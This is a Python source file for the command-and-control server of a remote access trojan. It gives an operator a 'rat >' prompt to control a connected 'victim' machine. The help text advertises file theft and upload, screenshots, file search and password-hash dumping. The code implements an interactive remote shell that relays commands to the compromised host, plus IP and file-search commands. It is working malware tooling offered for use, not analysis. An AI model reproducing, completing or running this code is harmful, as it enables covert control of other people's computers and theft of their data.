#!/usr/bin/python3
from secure_socket import Server
from sys import argv
from time import sleep

def help():
  print("""
COMMANDS :

  help                   Display this.
  download [file|path]   Get a file from the victim.
  upload   [file|path]   Put a file on the victim.
  shell                  Start a shell on the victim.
  ipconfig               Display the victim's IP configuration.
  screenshot             Take a screenshot from the victim's screen.
  search   file [path]   Find the location of a file in a directory, defaults to root directory.
  hashdump               Dump the sensitive data about users and passwords.
  exit                   Let the victim go.
""")

def ipconfig(victim):
  victim.send('ip')
  print(victim.receive())

def search(victim, filename, path):
  victim.send('search')
  victim.send(' '.join([filename,path]))
  result = (victim.receive())
  if result == "":
    print("File not found")
  else:
    print(result)

def shell(victim):
  victim.send('shell')
  ps1=victim.receive()
  cmd=input(ps1)
  while cmd!='exit':
    victim.send(cmd)
    print(victim.receive())
    sleep(0.2)
    ps1=victim.receive()
    cmd=input(ps1)
  victim.send('exit')

def run_command(server, cmd):
  command=cmd.split(" ")[0]
  match command:
    case 'help':
      help()
    case 'download':
      print('command still in dev :/')
      #download(cmd.split(" ")[1:])
    case 'upload':
      print('command still in dev :/')
      #upload(cmd.split(" ")[1:])
    case 'shell':
      shell(server)
    case 'ipconfig':
      ipconfig(server)
    case 'screenshot':
      print('command still in dev :/')
      #screenshot()
    case 'search':
      check = cmd.split(" ")
      if len(check) ==2 and not "" in check:
        name = check[1]
        path = '/'
        search(server,name,path)
      elif len(check) ==3 and not "" in check :
        path = check[1]
        name = check[2]
        search(server,name,path)
      else:
        print("search file [path] Find the location of a file in a directory, defaults to root directory.")
    case 'hashdump':
      print('command still in dev :/')
      #hashdump()
    case '':
      pass
    case 'exit':
      return False
    case _:
      print(f"Unknown command : {command}")
  return True

if __name__ == "__main__":
  try:
    port=int(argv[1])
    if port<1025 or port>65535:
      port=62832
  except:
    port=62832
    
  server=Server(port=port)
  
  try:
    running=True
    while running:
      print("[*] Waiting...", end="\r")
      server.accept_client()
      
      print("[+] Agent received !")
      using=True
      while using:
        cmd=input("rat > ")
        using=run_command(server, cmd)
      server.disconnect()

  except KeyboardInterrupt:
    server.stop()
    
  print("\r Server stopped.")
